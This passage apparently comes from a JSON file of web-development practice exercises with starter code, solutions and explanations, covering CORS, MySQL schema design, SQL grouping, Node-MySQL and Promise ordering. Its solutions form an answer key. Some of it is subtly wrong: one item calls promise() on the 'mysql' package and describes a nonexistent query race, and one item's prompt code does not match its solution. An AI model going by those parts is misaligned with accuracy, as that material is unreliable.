handle the browser&#39;s preflight \u003ccode\u003eOPTIONS\u003c/code\u003e request — the browser sends \u003ccode\u003eOPTIONS\u003c/code\u003e before \u003ccode\u003ePOST\u003c/code\u003e or \u003ccode\u003ePUT\u003c/code\u003e with \u003ccode\u003eContent-Type: application/json\u003c/code\u003e, and if the server has no \u003ccode\u003eOPTIONS\u003c/code\u003e handler, the preflight fails and the actual request is never sent. Middleware registered with \u003ccode\u003eapp.use()\u003c/code\u003e runs for every request, including \u003ccode\u003eOPTIONS\u003c/code\u003e.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":19,"id":"db-relational-design","title":"Design a relational schema: patient visits","lang":"sql","tags":["MySQL","primary-key","foreign-key","1NF","2NF","referential-integrity","1:M"],"source":"Slide 7, Quiz 10","prompt_html":"\u003cp\u003eA clinic tracks patients and their visit dates. The requirements are:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEach patient has a unique ID and a name.\u003c/li\u003e\n\u003cli\u003eEach visit records which patient attended and on which date.\u003c/li\u003e\n\u003cli\u003eOne patient can have many visits.\u003c/li\u003e\n\u003cli\u003eA visit row must always belong to a valid patient.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eDesign two SQL tables that satisfy these requirements. Declare all primary keys and foreign keys explicitly.\u003c/p\u003e\n\u003cp\u003eThe entity-relationship diagram below shows the target schema:\u003c/p\u003e\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"520\" height=\"180\" font-family=\"monospace\" font-size=\"13\"\u003e\n  \u003c!-- Patient box --\u003e\n  \u003crect x=\"20\" y=\"30\" width=\"180\" height=\"120\" rx=\"4\" fill=\"#f0f4ff\" stroke=\"#3b5bdb\" stroke-width=\"2\"/\u003e\n  \u003crect x=\"20\" y=\"30\" width=\"180\" height=\"28\" rx=\"4\" fill=\"#3b5bdb\"/\u003e\n  \u003ctext x=\"110\" y=\"49\" text-anchor=\"middle\" fill=\"white\" font-weight=\"bold\"\u003ePatient\u003c/text\u003e\n  \u003ctext x=\"34\" y=\"77\" fill=\"#222\"\u003epatientid  INT  PK\u003c/text\u003e\n  \u003ctext x=\"34\" y=\"98\" fill=\"#222\"\u003ename  VARCHAR(100)\u003c/text\u003e\n\n  \u003c!-- Visit box --\u003e\n  \u003crect x=\"320\" y=\"30\" width=\"180\" height=\"135\" rx=\"4\" fill=\"#f0f4ff\" stroke=\"#3b5bdb\" stroke-width=\"2\"/\u003e\n  \u003crect x=\"320\" y=\"30\" width=\"180\" height=\"28\" rx=\"4\" fill=\"#3b5bdb\"/\u003e\n  \u003ctext x=\"410\" y=\"49\" text-anchor=\"middle\" fill=\"white\" font-weight=\"bold\"\u003eVisit\u003c/text\u003e\n  \u003ctext x=\"334\" y=\"77\" fill=\"#222\"\u003evisitid  INT  PK\u003c/text\u003e\n  \u003ctext x=\"334\" y=\"98\" fill=\"#222\"\u003epatientid  INT  FK\u003c/text\u003e\n  \u003ctext x=\"334\" y=\"119\" fill=\"#222\"\u003evisitDate  DATE\u003c/text\u003e\n\n  \u003c!-- Arrow line --\u003e\n  \u003cline x1=\"200\" y1=\"90\" x2=\"320\" y2=\"90\" stroke=\"#555\" stroke-width=\"2\" marker-end=\"url(#arrow)\"/\u003e\n  \u003cdefs\u003e\n    \u003cmarker id=\"arrow\" markerWidth=\"8\" markerHeight=\"8\" refX=\"6\" refY=\"3\" orient=\"auto\"\u003e\n      \u003cpath d=\"M0,0 L0,6 L8,3 z\" fill=\"#555\"/\u003e\n    \u003c/marker\u003e\n  \u003c/defs\u003e\n\n  \u003c!-- 1:M label --\u003e\n\u003cp\u003e  \u003ctext x=\"210\" y=\"84\" fill=\"#3b5bdb\" font-weight=\"bold\"\u003e1\u003c/text\u003e\n  \u003ctext x=\"297\" y=\"84\" fill=\"#3b5bdb\" font-weight=\"bold\"\u003eM\u003c/text\u003e\n\u003c/svg\u003e\u003c/p\u003e\n\u003chr\u003e","starter":"CREATE TABLE `patient` (\n  `patientid` int(11) NOT NULL,\n  `name` varchar(100) DEFAULT NULL\n  -- TODO: declare the primary key\n);\n\nCREATE TABLE `visit` (\n  `visitid` int(11) NOT NULL,\n  `patientid` int(11) NOT NULL,\n  `visitDate` date NOT NULL\n  -- TODO: declare the primary key for visitid\n  -- TODO: declare the foreign key referencing patient\n);","solution":"CREATE TABLE `patient` (\n  `patientid` int(11) NOT NULL,\n  `name` varchar(100) DEFAULT NULL,\n  PRIMARY KEY(patientid)\n);\n\nCREATE TABLE `visit` (\n  `visitid` int(11) NOT NULL,\n  `patientid` int(11) NOT NULL,\n  `visitDate` date NOT NULL,\n  PRIMARY KEY(visitid),\n  CONSTRAINT fk_has_patient FOREIGN KEY(patientid)\n           REFERENCES patient(patientid)\n);\n\nINSERT INTO patient VALUES (1,'Sara Brown'),(2,'John Smith'),(3,'Jack Ma');\nINSERT INTO visit VALUES (1,1,'2002-01-01'),(2,2,'2018-08-08'),(3,2,'2019-09-09');","why_html":"\u003cp\u003e\u003cstrong\u003eThe parent table must be created first.\u003c/strong\u003e The \u003ccode\u003evisit\u003c/code\u003e table&#39;s foreign key constraint references \u003ccode\u003epatient(patientid)\u003c/code\u003e. MySQL resolves that reference at table-creation time. Attempting to create \u003ccode\u003evisit\u003c/code\u003e before \u003ccode\u003epatient\u003c/code\u003e exists raises an error — the referenced table is not yet in the schema.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAUTO_INCREMENT removes manual ID tracking.\u003c/strong\u003e Declaring \u003ccode\u003epatientid int AUTO_INCREMENT\u003c/code\u003e lets the database assign the next unique integer on every INSERT. Without it, every INSERT must supply a unique value manually. Collisions or gaps become the application&#39;s responsibility.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOne-table approach violates 2NF.\u003c/strong\u003e Storing \u003ccode\u003epatientid, name, visitDate\u003c/code\u003e all in one table repeats the patient name on every visit row. The \u003ccode\u003ename\u003c/code\u003e column depends on \u003ccode\u003epatientid\u003c/code\u003e, but \u003ccode\u003evisitDate\u003c/code\u003e depends on the visit event — not on the patient alone. That mixed dependency violates second normal form (2NF). Splitting into two tables gives each column exactly one entity to describe.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approach — single-table design:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003e-- Wrong: mixes two entities; violates 2NF\nCREATE TABLE patient_visit (\n  patientid INT NOT NULL,\n  name VARCHAR(100),\n  visitDate DATE,\n  PRIMARY KEY(patientid)  -- wrong: patientid is not unique per visit\n);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis fails for two reasons: \u003ccode\u003epatientid\u003c/code\u003e cannot be the primary key because the same patient can appear on multiple visit rows, and \u003ccode\u003ename\u003c/code\u003e repeats redundantly on every row. Splitting into \u003ccode\u003epatient\u003c/code\u003e and \u003ccode\u003evisit\u003c/code\u003e tables, each with its own primary key, resolves both problems.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":20,"id":"sql-crud","title":"SQL queries: GROUP BY, HAVING, and subqueries","lang":"sql","tags":["SQL","GROUP-BY","HAVING","subquery","WHERE"],"source":"Slide 7, Quiz 10","prompt_html":"\u003cp\u003eThe NorthWind-style Customers table has three columns: \u003ccode\u003eCustomerID\u003c/code\u003e, \u003ccode\u003eCustomerName\u003c/code\u003e, and \u003ccode\u003eCountry\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWrite a query that lists each country alongside its customer count, but returns only countries with more than 2 customers.\u003c/p\u003e\n\u003chr\u003e","starter":"SELECT Country, COUNT(CustomerID) AS c\nFROM Customers\nWHERE c \u003e 2\nGROUP BY Country;","solution":"SELECT Country, COUNT(CustomerID) AS c\nFROM Customers\nGROUP BY Country\nHAVING c \u003e 2;","why_html":"\u003cp\u003e\u003cstrong\u003eWhy WHERE c &gt; 2 fails:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThe database processes clauses in a fixed order: FROM → WHERE → GROUP BY → HAVING → SELECT. WHERE fires before GROUP BY runs. At that point, no groups exist yet, so COUNT has not been computed and the alias \u003ccode\u003ec\u003c/code\u003e does not exist. The database rejects the query with an error.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy HAVING works:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eHAVING fires after GROUP BY. Each group has been formed and its aggregate value computed. HAVING can now compare \u003ccode\u003ec\u003c/code\u003e (the count per country) against 2 and discard any group below the threshold.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approach — alias in WHERE:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003e-- Wrong: alias &#39;c&#39; is not visible to WHERE\nSELECT Country, COUNT(CustomerID) AS c\nFROM Customers\nWHERE c &gt; 2\nGROUP BY Country;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe alias exists only in the SELECT output, which is computed last. WHERE cannot reference it.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCorrect structure:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003e-- WHERE filters individual rows before grouping (use it for non-aggregate conditions)\n-- HAVING filters groups after aggregation\nSELECT Country, COUNT(CustomerID) AS c\nFROM Customers\nWHERE Country LIKE &#39;A%&#39;   -- optional: filter rows before grouping\nGROUP BY Country\nHAVING c &gt; 2;             -- filter groups after COUNT runs\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf you also want to restrict which rows enter the grouping (for example, only countries starting with &#39;A&#39;), add a WHERE clause before GROUP BY. The two clauses serve different purposes and can coexist.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":21,"id":"sql-promises","title":"Promise-chained SQL: check existence then update","lang":"js","tags":["promises","mysql","async-db","chaining"],"source":"Slide 11","prompt_html":"\u003cp\u003eImplement a \u003ccode\u003ePUT /patients/:id\u003c/code\u003e handler that does the following:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eChecks if the patient exists by running a SELECT query against the \u003ccode\u003epatient\u003c/code\u003e table.\u003c/li\u003e\n\u003cli\u003eRejects with an error (\u003ccode\u003e&#39;Patient not found&#39;\u003c/code\u003e) if the SELECT returns no rows.\u003c/li\u003e\n\u003cli\u003eUpdates the patient&#39;s \u003ccode\u003ename\u003c/code\u003e field using an UPDATE query if the row exists.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eUse \u003ccode\u003emysql.promise()\u003c/code\u003e to get a promise-based connection and \u003ccode\u003easync/await\u003c/code\u003e to sequence the two queries. Return the UPDATE result object.\u003c/p\u003e\n\u003chr\u003e","starter":"const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\napp.use(express.json());\n\n// Connection is already established — do not modify.\nconst con = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'mydb'\n});\n\nconst promiseCon = con.promise();\n\n// TODO: implement this function.\n// It must:\n//   1. SELECT the patient row by patientid\n//   2. Throw an error with message 'Patient not found' if no row is returned\n//   3. UPDATE the patient's name\n//   4. Return the UPDATE result\nasync function updatePatient(patientId, newName) {\n  // your code here\n}\n\napp.put('/patients/:id', async (req, res) =\u003e {\n  const { id } = req.params;\n  const { name } = req.body;\n  try {\n    const result = await updatePatient(id, name);\n    res.json({ affectedRows: result.affectedRows });\n  } catch (err) {\n    res.status(404).json({ error: err.message });\n  }\n});\n\napp.listen(3000);","solution":"const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\napp.use(express.json());\n\nconst con = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'mydb'\n});\n\nconst promiseCon = con.promise();\n\nasync function updatePatient(patientId, newName) {\n  // Step 1: check existence\n  const [rows] = await promiseCon.query(\n    'SELECT * FROM patient WHERE patientid = ?',\n    [patientId]\n  );\n\n  // Step 2: reject if not found\n  if (rows.length === 0) {\n    throw new Error('Patient not found');\n  }\n\n  // Step 3: update the name\n  const [result] = await promiseCon.query(\n    'UPDATE patient SET name = ? WHERE patientid = ?',\n    [newName, patientId]\n  );\n\n  // Step 4: return the UPDATE result\n  return result;\n}\n\napp.put('/patients/:id', async (req, res) =\u003e {\n  const { id } = req.params;\n  const { name } = req.body;\n  try {\n    const result = await updatePatient(id, name);\n    res.json({ affectedRows: result.affectedRows });\n  } catch (err) {\n    res.status(404).json({ error: err.message });\n  }\n});\n\napp.listen(3000);","why_html":"\u003cp\u003e\u003cstrong\u003eThe check must happen before the update.\u003c/strong\u003e\nThe SELECT confirms the row exists at the application layer before any write occurs. Without it, an UPDATE on a nonexistent \u003ccode\u003epatientid\u003c/code\u003e returns \u003ccode\u003eaffectedRows: 0\u003c/code\u003e silently — the caller receives a success-looking response for a no-op. Checking first allows the server to return a meaningful 404.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy \u003ccode\u003emysql.promise()\u003c/code\u003e over callback nesting.\u003c/strong\u003e\n\u003ccode\u003epromiseCon.query()\u003c/code\u003e returns a Promise. Each \u003ccode\u003eawait\u003c/code\u003e suspends \u003ccode\u003eupdatePatient\u003c/code\u003e until that Promise settles, so the second query only starts after the first resolves. The equivalent callback pattern nests the UPDATE callback inside the SELECT callback — manageable for two queries, but error handling duplicates at every nesting level and the indentation grows with every additional query. A single \u003ccode\u003etry/catch\u003c/code\u003e on the \u003ccode\u003easync\u003c/code\u003e function covers all errors from both queries.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approach: firing both queries without awaiting.\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003e// Wrong — no ordering guarantee\npromiseCon.query(&#39;SELECT * FROM patient WHERE patientid = ?&#39;, [patientId]);\npromiseCon.query(&#39;UPDATE patient SET name = ? WHERE patientid = ?&#39;, [newName, patientId]);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBoth queries enter the MySQL queue simultaneously. The UPDATE executes before the SELECT result arrives. The existence check never runs, and the function returns \u003ccode\u003eundefined\u003c/code\u003e instead of the UPDATE result. This is a race condition.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":22,"id":"nodejs-db-connect","title":"Connect Node.js to MySQL and insert a record","lang":"js","tags":["mysql","nodejs","npm","CRUD"],"source":"Slide 5, Quiz 7","prompt_html":"\u003cp\u003eWrite a Node.js script that connects to a local MySQL database named \u003ccode\u003eclinic\u003c/code\u003e and inserts a new patient record (name: \u003ccode\u003e&#39;Ada Lovelace&#39;\u003c/code\u003e) into the \u003ccode\u003epatient\u003c/code\u003e table. Assume XAMPP is running and the table already exists with columns \u003ccode\u003epatientid\u003c/code\u003e (AUTO_INCREMENT) and \u003ccode\u003ename\u003c/code\u003e.\u003c/p\u003e","starter":"const mysql = require('mysql');\n\n// Step 1: create the connection object\nconst con = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'clinic'\n});\n\n// Step 2: connect to MySQL — add the connect() call here\n\n  // Step 3: insert a patient named 'Ada Lovelace' — add the query() call here\n","solution":"const mysql = require('mysql');\n\n// Step 1: create the connection object\nconst con = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'clinic'\n});\n\n// Step 2: open the connection\ncon.connect(function(err) {\n  if (err) throw err;\n  console.log('Connected to clinic database.');\n\n  // Step 3: insert a new patient — patientid is omitted because it is AUTO_INCREMENT\n  con.query(\n    \"INSERT INTO patient (name) VALUES ('Ada Lovelace')\",\n    function(err, result) {\n      if (err) throw err;\n      console.log('Patient inserted. New patientid:', result.insertId);\n    }\n  );\n});","why_html":"\u003cp\u003e\u003cstrong\u003eWhy does \u003ccode\u003emysql\u003c/code\u003e need \u003ccode\u003enpm install\u003c/code\u003e?\u003c/strong\u003e\n\u003ccode\u003emysql\u003c/code\u003e is an external package — it does not ship with Node.js. Built-in modules like \u003ccode\u003ehttp\u003c/code\u003e, \u003ccode\u003efs\u003c/code\u003e, and \u003ccode\u003epath\u003c/code\u003e are available immediately via \u003ccode\u003erequire\u003c/code\u003e. The \u003ccode\u003emysql\u003c/code\u003e package must be added to your project first: run \u003ccode\u003enpm install mysql\u003c/code\u003e in the project directory. Skipping this step causes a &quot;Cannot find module &#39;mysql&#39;&quot; crash when the script starts.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy is \u003ccode\u003epatientid\u003c/code\u003e omitted from the INSERT?\u003c/strong\u003e\nThe \u003ccode\u003epatientid\u003c/code\u003e column is declared \u003ccode\u003eAUTO_INCREMENT\u003c/code\u003e. MySQL assigns the next unique integer automatically on every INSERT. You do not supply that value — supplying it would override the counter and risk collisions. \u003ccode\u003eresult.insertId\u003c/code\u003e inside the callback gives you the generated id if you need it.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approach — accessing the result outside the callback:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econ.query(&quot;INSERT INTO patient (name) VALUES (&#39;Ada Lovelace&#39;)&quot;, function(err, result) {\n  // result is available here\n});\nconsole.log(result); // WRONG — result is undefined here; the callback has not fired yet\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003econ.query\u003c/code\u003e is asynchronous. Node.js sends the SQL to MySQL and immediately continues to the next synchronous line. The callback fires later, when MySQL responds. Any code that needs \u003ccode\u003eresult\u003c/code\u003e must live inside the callback.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":23,"id":"promises-basics-practice","title":"Trace Promise execution order","lang":"js","tags":[],"source":"Slide 6, ISAQuiz8","prompt_html":"\u003cp\u003eRead the code below and answer two questions:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWhat is the exact console output, in order? Write your answer as a comma-separated list.\u003c/li\u003e\n\u003cli\u003eFor each line of output, explain which mechanism caused it to print at that point: synchronous executor, microtask queue, or ignored-because-already-settled.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003elet promise = new Promise(function(resolve, reject) {\n  console.log(&#39;2&#39;);\n  reject(&#39;3&#39;);\n  resolve(&#39;4&#39;);\n  console.log(&#39;5&#39;);\n});\n\npromise.then(\n  function(value)  { console.log(value); },\n  function(reason) { console.log(reason); }\n);\n\nconsole.log(&#39;1&#39;);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is ISAQuiz8 Q3 pattern. The trap: \u003ccode\u003eresolve(&#39;4&#39;)\u003c/code\u003e is called after \u003ccode\u003ereject(&#39;3&#39;)\u003c/code\u003e, but \u003ccode\u003e&#39;4&#39;\u003c/code\u003e does not appear in the output. Explain why.\u003c/p\u003e","starter":"let p = new Promise(function(resolve, reject) {\n  console.log('A');\n  resolve('B');   // called first — what state does this produce?\n  reject('C');    // called second — what happens?\n  console.log('D');\n});\n\np.then(\n  function(value)  { console.log(value); },  // fires if ___\n  function(reason) { console.log(reason); }  // fires if ___\n);\n\nconsole.log('E');\n\n// Predict the output:\n// __, __, __, __\n// Is 'C' ever logged? ___\n// Why? ___","solution":"// Output of the starter: A, D, E, B\n// 'C' is never logged.\n\nlet p = new Promise(function(resolve, reject) {\n  console.log('A'); // 1st: executor runs eagerly — sync\n  resolve('B');     // 2nd: state → fulfilled (sync); enqueue .then(onFulfilled) as microtask\n  reject('C');      // ignored — promise already settled by resolve('B')\n  console.log('D'); // 3rd: executor continues synchronously\n});\n\np.then(\n  function(value)  { console.log(value); },  // fires when fulfilled\n  function(reason) { console.log(reason); }  // fires when rejected\n);\n\nconsole.log('E'); // 4th: synchronous, after executor and .then() registration\n\n// Call stack empties.\n// Microtask queue drains:\n//   → onFulfilled('B') runs → logs 'B'   // 5th\n\n// Final output: A, D, E, B\n// 'C' is never logged because resolve('B') settled the promise first.\n// reject('C') is silently ignored — settlement is permanent.","why_html":"\u003cp\u003e\u003cstrong\u003eThe executor runs eagerly — synchronously on construction.\u003c/strong\u003e\n\u003ccode\u003enew Promise(executor)\u003c/code\u003e calls \u003ccode\u003eexecutor\u003c/code\u003e immediately. Every \u003ccode\u003econsole.log\u003c/code\u003e inside the executor prints before any subsequent statement outside the Promise. That is why \u003ccode\u003e&#39;A&#39;\u003c/code\u003e and \u003ccode\u003e&#39;D&#39;\u003c/code\u003e appear before \u003ccode\u003e&#39;E&#39;\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eresolve()\u003c/code\u003e and \u003ccode\u003ereject()\u003c/code\u003e are mutually exclusive — first call wins.\u003c/strong\u003e\n\u003ccode\u003eresolve(&#39;B&#39;)\u003c/code\u003e transitions the Promise from pending to fulfilled. The state is now locked. When \u003ccode\u003ereject(&#39;C&#39;)\u003c/code\u003e runs a moment later, the Promise is already settled, so the runtime silently ignores it. \u003ccode\u003e&#39;C&#39;\u003c/code\u003e never reaches any handler.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eresolve()\u003c/code\u003e enqueues the handler; it does not call it inline.\u003c/strong\u003e\n\u003ccode\u003eresolve(&#39;B&#39;)\u003c/code\u003e changes the Promise&#39;s state synchronously, then places the \u003ccode\u003eonFulfilled\u003c/code\u003e callback in the microtask queue. The callback does not run until the current call stack is empty. \u003ccode\u003econsole.log(&#39;E&#39;)\u003c/code\u003e is still on the call stack, so it runs before \u003ccode\u003e&#39;B&#39;\u003c/code\u003e is logged.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approaches:\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cem\u003eAssuming \u003ccode\u003e.then()\u003c/code\u003e fires when \u003ccode\u003eresolve()\u003c/code\u003e is called.\u003c/em\u003e Students write the output as \u003ccode\u003eA, B, D, E\u003c/code\u003e — placing \u003ccode\u003e&#39;B&#39;\u003c/code\u003e right after \u003ccode\u003eresolve()\u003c/code\u003e. \u003ccode\u003eresolve()\u003c/code\u003e only enqueues the handler. The handler runs after the stack empties.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cem\u003eAssuming both \u003ccode\u003eresolve\u003c/code\u003e and \u003ccode\u003ereject\u003c/code\u003e run because they are both called.\u003c/em\u003e Both calls execute in the executor, but only the first one settles the Promise. The second is a no-op. A Promise cannot be both fulfilled and rejected.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e"},{"kind":"code","variant":"starter-solution","n":24,"id":"promise-chaining-practice","title":"Promise Chain Execution Order — Microtasks vs. Macrotasks","lang":"js","tags":[],"source":"ISAQuiz9, Slide 6","prompt_html":"\u003cp\u003eRead the code below. Predict the exact console output order and explain why each line prints when it does.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econsole.log(&#39;A&#39;);\n\nsetTimeout(() =&gt; console.log(&#39;B&#39;), 0);\n\nPromise.resolve()\n  .then(() =&gt; {\n    console.log(&#39;C&#39;);\n    return &#39;fromC&#39;;\n  })\n  .then(val =&gt; {\n    console.log(&#39;D:&#39;, val);\n  });\n\nsetTimeout(() =&gt; console.log(&#39;E&#39;), 0);\n\nconsole.log(&#39;F&#39;);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYour task has two parts:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eList the output lines in order.\u003c/li\u003e\n\u003cli\u003eFor each line, state whether its source was the call stack, the microtask queue, or the macrotask queue.\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch3\u003eQueue model (ASCII)\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003eCALL STACK          MICROTASK QUEUE      MACROTASK QUEUE\n──────────          ───────────────      ───────────────\nconsole.log(&#39;A&#39;)                         [setTimeout B cb]\nPromise.resolve()   [then → log(&#39;C&#39;)]    [setTimeout E cb]\nconsole.log(&#39;F&#39;)\n                    ───── drain ──────\n                    log(&#39;C&#39;) runs\n                    [then → log(&#39;D&#39;)]\n                    log(&#39;D&#39;:&#39;fromC&#39;) runs\n                                         ── next macrotask ──\n                                         log(&#39;B&#39;) runs\n                                         log(&#39;E&#39;) runs\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe event loop does not pull from the macrotask queue until the microtask queue is empty.\u003c/p\u003e\n\u003chr\u003e","starter":"console.log('A');\n\nsetTimeout(() =\u003e console.log('B'), 0);\n\nPromise.resolve()\n  .then(() =\u003e {\n    console.log('C');\n    return 'fromC';\n  })\n  .then(val =\u003e {\n    console.log('D:', val);\n  });\n\nsetTimeout(() =\u003e console.log('E'), 0);\n\nconsole.log('F');\n\n// TODO: write the expected output below, one line per console.log call.\n// Format: // output: \u003cvalue\u003e\n\n// Line 1: // output:\n// Line 2: // output:\n// Line 3: // output:\n// Line 4: // output:\n// Line 5: // output:\n// Line 6: // output:","solution":"console.log('A');\n// CALL STACK — runs synchronously first\n// output: A\n\nsetTimeout(() =\u003e console.log('B'), 0);\n// Schedules 'B' callback in macrotask queue. Does not run yet.\n\nPromise.resolve()\n  .then(() =\u003e {\n    console.log('C');\n    // MICROTASK QUEUE — dispatched after call stack empties\n    // output: C\n    return 'fromC';\n    // Returning 'fromC' fulfills the next Promise with 'fromC'\n    // Schedules the second .then() as a new microtask\n  })\n  .then(val =\u003e {\n    console.log('D:', val);\n    // MICROTASK QUEUE — runs immediately after 'C' microtask completes\n    // output: D: fromC\n  });\n\nsetTimeout(() =\u003e console.log('E'), 0);\n// Schedules 'E' callback in macrotask queue. Does not run yet.\n\nconsole.log('F');\n// CALL STACK — still synchronous, runs before any queued callbacks\n// output: F\n\n// --- call stack now empty ---\n// Microtask queue drains:\n//   1. then-C runs → logs C, queues then-D\n//   2. then-D runs → logs D: fromC\n// Microtask queue is now empty.\n\n// Macrotask queue processes one task:\n//   1. setTimeout-B fires → logs B\n\n// Microtask queue checked again — empty.\n\n// Macrotask queue processes next task:\n//   2. setTimeout-E fires → logs E","why_html":"\u003ch3\u003eMicrotask queue priority\u003c/h3\u003e\n\u003cp\u003eWhen the call stack empties, the event loop drains the entire microtask queue before pulling any macrotask. \u003ccode\u003e.then()\u003c/code\u003e and \u003ccode\u003e.catch()\u003c/code\u003e callbacks are microtasks. \u003ccode\u003esetTimeout\u003c/code\u003e callbacks are macrotasks.\u003c/p\u003e\n\u003cp\u003eIn this exercise:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eA\u003c/code\u003e and \u003ccode\u003eF\u003c/code\u003e are synchronous — they run on the call stack before anything else.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC\u003c/code\u003e and \u003ccode\u003eD\u003c/code\u003e are microtasks — both drain before either macrotask fires.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eB\u003c/code\u003e and \u003ccode\u003eE\u003c/code\u003e are macrotasks — each fires only after the microtask queue is empty at that moment.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eCommon wrong answers\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eWrong answer 1 — assuming interleaving:\u003c/strong\u003e \u003ccode\u003eA, F, C, B, D, E\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThis assumes \u003ccode\u003esetTimeout(&#39;B&#39;)\u003c/code\u003e fires between the two \u003ccode\u003e.then()\u003c/code\u003e calls because it was registered first. The microtask queue does not yield between callbacks — it drains completely. \u003ccode\u003eD\u003c/code\u003e always runs before \u003ccode\u003eB\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWrong answer 2 — assuming setTimeout fires first:\u003c/strong\u003e \u003ccode\u003eA, B, F, C, D, E\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esetTimeout\u003c/code\u003e with delay \u003ccode\u003e0\u003c/code\u003e does not mean &quot;run immediately.&quot; It schedules a macrotask. The call stack (\u003ccode\u003eF\u003c/code\u003e) and then all microtasks (\u003ccode\u003eC\u003c/code\u003e, \u003ccode\u003eD\u003c/code\u003e) complete first.\u003c/p\u003e\n\u003ch3\u003eReturn value propagation\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ereturn &#39;fromC&#39;\u003c/code\u003e inside the first \u003ccode\u003e.then()\u003c/code\u003e fulfills the Promise that \u003ccode\u003e.then()\u003c/code\u003e returned, with the value \u003ccode\u003e&#39;fromC&#39;\u003c/code\u003e. The second \u003ccode\u003e.then()\u003c/code\u003e receives \u003ccode\u003e&#39;fromC&#39;\u003c/code\u003e as its argument \u003ccode\u003eval\u003c/code\u003e. This is how values flow forward through a chain.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":25,"id":"async-await-practice","title":"Refactor a Promise Chain to async/await","lang":"js","tags":[],"source":"Slide 9","prompt_html":"\u003cp\u003eThe function below uses a \u003ccode\u003e.then()\u003c/code\u003e chain to fetch a user&#39;s name from an API and log it.\nRefactor it to use \u003ccode\u003easync/await\u003c/code\u003e syntax. The behavior must be identical — same Promise returned to the caller, same error handling.\u003c/p\u003e","starter":"// Promise-chain version — refactor this to async/await\nfunction getUserName(userId) {\n  return fetch(`/api/users/${userId}`)\n    .then(function(response) {\n      return response.json();\n    })\n    .then(function(data) {\n      return data.name;\n    })\n    .catch(function(err) {\n      console.error(\"Failed to load user:\", err);\n      return null;\n    });\n}\n\n// Caller — do not change this\ngetUserName(42).then(name =\u003e console.log(name));","solution":"// async/await version — identical behavior\nasync function getUserName(userId) {\n  try {\n    const response = await fetch(`/api/users/${userId}`);\n    const data = await response.json();\n    return data.name;\n  } catch (err) {\n    console.error(\"Failed to load user:\", err);\n    return null;\n  }\n}\n\n// Caller is unchanged — getUserName still returns a 